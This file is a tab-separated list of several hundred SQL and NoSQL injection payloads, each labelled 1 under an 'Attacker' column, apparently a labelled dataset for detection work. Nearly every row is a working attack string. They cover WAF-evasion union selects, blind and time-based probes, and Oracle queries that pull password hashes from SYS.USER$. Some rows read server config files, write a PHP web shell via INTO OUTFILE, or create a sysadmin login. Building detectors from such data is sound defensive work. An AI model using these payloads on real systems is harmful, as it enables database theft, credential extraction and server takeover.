Payload	Attacker
?id=1 ^ (select(ascii((substring((select db_name(1)) ,1,1)))))-108	1
1' union distinctrow select/*!USER*/(),/*!DATABASE*/()#	1
1' /*!UNION/**//**/ALL*//*!SELECT*//*!USER*/(),/*!USER*/()#	1
id=' -- ') union select user,database() from users %23&Submit=Submit#	1
id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,1,1%29%29=114	1
union all /*!/*!select*/1 as %27*/%27,2,3,4,5 from mysql.user%23	1
xxx'and'0'=(select top 1 '1' as [/*] from admin as [*//*]) union all select 1 as [*//*],2,username,password,5 from admin as [*/]	1
99999=(select '--+') union all select 1,2,3,4,5 from mysql.user%23	1
99999=(/*!select--*/1) union all select 1,2,3,4,5 from mysql.user%23	1
.and '0'=(select top 1 '--+' from admin) union all select 1,2,3 from admin	1
Q=1' UNION ALL SELECT NULL,NULL,NULL,NULL,CHR(113)||CHR(107)||CHR(112)||CHR(106)||CHR(113)||NVL(CAST(OWNER AS VARCHAR(4000)),CHR(32))||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113) FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)--	1
id=0%23%0AAND%23%0A1=1	1
and--!!!1=- -!!!1	1
||1=0	1
extractvalue(floor(0),concat(0x0a,unhex(hex(user()))))	1
updatexml(0,lpad(.1,350,hex(hex(user()))),1)	1
(select(select{x pwd}from{x %23@__admin}+limit+1)	1
id=4+and%23fuck%0a1=2+union+%23qa%0Aselect+1,(load_file(0x433a5c57494e444f57535c73797374656d33325c647269766572735c6574635c686f737473)),3,4,5,6,7,8,9,10	1
insert into users (user_id,first_name) values(18,(select(select{x name}from{x guestbook}limit 1)))#test	1
id=08Eunion select 1,2,3%23	1
id=49 %u0061nd 1=1	1
%23AAAAAAAAAAA%0Aunion %23AAAAAAA%0Aselect 1,/*!aes_decrypt(aes_encrypt(version(),1),1)*/,3,'_Y000!_',5,6,7--	1
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -	1
/*!%55nion*/%20/*!%53elect*/1	1
/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5	1
/*!12345%55nion*/ /*!12345%53elect*/ 1,2	1
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6	1
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)	1
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)	1
group_concat(/*!12345table_name*/)	1
/*!12345group_concat*/(/*!12345table_name*/)	1
/*!50000gRouP_cOnCaT*/()	1
select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()	1
select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()	1
extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))	1
+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+	1
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...	1
select json_array(current_user())	1
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+	1
+/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+	1
+union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+	1
select versionnumber, version_timestamp from sysibm.sysversions;	1
select current server from sysibm.sysdummy1;	1
select * from syscat.dbauth where grantee = current user;	1
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i	1
' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i	1
$where: '1 == 1'	1
', $or: [ {}, { 'a':'a	1
|| 1==1	1
'%20%26%26%20this.passwordzz.match(/.*/)//+%00	1
';sleep(5000);'	1
(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20(information_schema.schemata)%20where%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,schema_name))))x)	1
concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0)%20from(information_schema./**/columns)where(table_schema=database())%20and(0x00)in(@x:=Concat/*!(@x,%200x3c62723e,%20if(%20(@tbl!=table_name),%20Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1,%202,%200x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e),%200x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/	1
(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))	1
(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)	1
"+OR+weight_string(""foo"")=weight_string(""foo"")--"	1
make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)	1
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)	1
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...	1
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-	1
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--	1
?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--	1
?id=1 and left(version(),1)=4	1
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'	1
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)	1
RLIKE SLEEP([SLEEPTIME])	1
1 and (select sleep(10) from dual where database() like '____')#	1
1 and (select sleep(10) from dual where database() like 'sa___')#	1
1 and (select sleep(10) from dual where database() like 'swi__')#	1
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2	1
/foo/?theName=YAP&idNumber=24'||'8'||'001 TRUE	1
SELECT DISTINCT grantee FROM dba_sy­s_privs WHERE ADMIN_­OPTION = ‘YES’;	1
SELECT SYS.DA­TAB­ASE­_NAME FROM DUAL;	1
‘ union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 — -	1
‘ union select 1,2,3, load_file(‘/var/www/test’) ,5,6,7,8 — -	1
?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘c:/xampp/htdocs/cmd.php’	1
**/*!50000**ORDER BY***/	1
IF condition THEN true-part; ELSE false-part (S) IF (1=1) SELECT 'true' ELSE SELECT 'false'	1
';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--	1
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)	1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1	1
select database_to_xmlschema(true,true,'');	1
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))	1
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'	1
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')	1
ProductID=1);waitfor delay '0:0:10'--	1
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;	1
"EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT ""DOMINIO\SERVER1""') AT ""DOMINIO\SERVER2"""	1
-1+%55nIoN(%53EleCt+1)+ — +	1
%55nion(%53elect 1,2,3)-- -	1
/**//*!50000UNION SELECT*//**/	1
+ #?uNiOn + #?sEleCt	1
+un/**/ion+se/**/lect	1
REVERSE(noinu)+REVERSE(tceles)	1
union+/*!select*/	1
/**//*!union*//**//*!select*//**/	1
uNiOn aLl sElEcT	1
%0Aunion%0Aselect%0A	1
%0A%09UNION%0CSELECT%10NULL%	1
+UnIoN/*&a=*/SeLeCT/*&a=*/	1
union(select (1),(2),(3),(4),(5))	1
union(select(1),2,3)	1
+#1q%0AuNiOn all#qa%0A#%0AsEleCt	1
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/	1
+UnIoN/*&a=*/SeLeCT/*&a=*/	1
+’UnI”On’+'SeL”ECT’	1
uni%20union%20/*!select*/%20	1
/*union*/union/*select*/select+	1
UNION/*&test=1*/SELECT/*&pwn=2*/	1
%252f%252a*/union%252f%252a /select%252f%252a*/	1
/*!UnIoN*/SeLecT+	1
CoNcAt()	1
unhex(hex(concat(table_name)))	1
unhex(hex(/*!group_concat*/(/*!table_name*/)))	1
unhex(hex(/*!50000group_concat*/(table_name)))	1
convert(group_concat(/*!table_name*/)+using+ascii)	1
'	1
,	1
//	1
"' or """	1
' OR 1 -- -	1
'='	1
' OR 'x'='x	1
/*…*/ 	1
@variable	1
AND true	1
1*56	1
1' ORDER BY 3--+	1
1' GROUP BY 1,2,3--+	1
-1 UNION SELECT 1 INTO @,@	1
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --	1
#	1
'	1
OR x=y	1
OR x=y#	1
OR x=y-- 	1
HAVING 1=0	1
HAVING 1=0-- 	1
AND 1=0-- 	1
AND 1=0 AND '%'='	1
AND 7506=9091 AND ('5913=5913	1
AND 7300=7300 AND ('pKlZ'='pKlY	1
AS INJECTX WHERE 1=1 AND 1=0#	1
WHERE 1=1 AND 1=0	1
WHERE 1=1 AND 1=0--	1
ORDER BY 4-- 	1
ORDER BY 8-- 	1
ORDER BY 12-- 	1
ORDER BY 16-- 	1
ORDER BY 20-- 	1
ORDER BY 24-- 	1
ORDER BY 28-- 	1
ORDER BY 1# 	1
ORDER BY 5# 	1
ORDER BY 9# 	1
ORDER BY 13# 	1
ORDER BY 17# 	1
ORDER BY 21# 	1
ORDER BY 25# 	1
ORDER BY 29# 	1
ORDER BY 2 	1
ORDER BY 6 	1
ORDER BY 10 	1
ORDER BY 14 	1
ORDER BY 18 	1
ORDER BY 22 	1
ORDER BY 26 	1
ORDER BY 30 	1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--	1
and (select substring(@@version,1,1))='X'	1
and (select substring(@@version,3,1))='c'	1
sleep(5)#	1
""" or sleep(5)="""	1
') or sleep(5)='	1
;waitfor delay '0:0:5'--	1
');waitfor delay '0:0:5'--	1
"""));waitfor delay '0:0:5'--"	1
' or benchmark(10000000,MD5(1))#	1
1)) or benchmark(10000000,MD5(1))#	1
1 or pg_sleep(5)--	1
""") or pg_sleep(5)--"	1
')) or pg_sleep(5)--	1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--	1
"SLEEP(5)="""	1
or SLEEP(5)--	1
waitfor delay '00:00:05'--	1
benchmark(50000000,MD5(1))#	1
pg_SLEEP(5)	1
or pg_SLEEP(5)--	1
AnD SLEEP(5)--	1
&&SLEEP(5)#	1
ORDER BY SLEEP(5)--	1
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--	1
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))	1
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29	1
ORDER BY 1,SLEEP(5),3#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#	1
ORDER BY 1,SLEEP(5),3,4-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- 	1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- 	1
UNION ALL SELECT 1	1
UNION ALL SELECT 1,2,3,4,5	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29	1
UNION ALL SELECT 1,2,3#	1
UNION ALL SELECT 1,2,3,4,5,6,7#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#	1
UNION ALL SELECT 1-- 	1
UNION ALL SELECT 1,2,3,4,5-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 	1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29	1
UNION SELECT @@VERSION,SLEEP(5),USER(),4#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#	1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#	1
UNION ALL SELECT SLEEP(5)-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))	1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))	1
